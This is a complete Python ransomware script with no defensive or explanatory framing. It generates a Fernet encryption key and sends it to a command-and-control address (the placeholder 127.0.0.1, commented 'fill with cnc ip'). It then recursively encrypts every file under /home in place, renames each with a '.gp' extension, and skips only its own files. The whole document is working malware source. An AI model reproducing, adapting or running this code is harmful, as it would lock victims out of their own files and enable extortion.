import os
from cryptography.fernet import Fernet
import socket

def keygen():
    key = Fernet.generate_key()
    with open("keyfile.key", "wb") as keyfile:
        keyfile.write(key)
    print("key file generation successful")

def send_data():
    host = "127.0.0.1" # fill with cnc ip
    port = 12345 # target port number here

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as clnt_sock:
        try:
            clnt_sock.connect((host, port))
            print("connected")
            try:
                keygen()
                with open("keyfile.key", "rb") as keyfile:
                    key = keyfile.read(128)
                if key:
                    clnt_sock.sendall(key)
                    print("key sent successful")
            except FileNotFoundError:
                print("key not found")
                return 0
        except ConnectionRefusedError:
            print("connection refused")
            return 0
    return 1

def encrypt_file(filepath):
    with open(filepath, "rb") as file:
        contents = file.read()
    
    # change keyfile location
    with open("keyfile.key", "rb") as keyfile:
        key = keyfile.read()
    encrypted_contents = Fernet(key).encrypt(contents)

    with open(filepath, "wb") as file:
        file.write(encrypted_contents)

def search_directories_from_root(root):
    for test in os.listdir(root):
            full_path = os.path.join(root, test)
            
            if test == "." or test == ".." or test == "keyfile.key" or test == "run.py" or test == "keyfile_generate.py" or test == "driver":
                continue

            if os.path.isfile(full_path):
                encrypt_file(full_path)
                renamed_file = full_path+".gp"
                os.rename(full_path, renamed_file)
            elif os.path.isdir(full_path):
                search_directories_from_root(full_path)
            else:
                continue
    
def run():
    if send_data():
        search_directories_from_root("/home")


if __name__ == "__main__":
    run()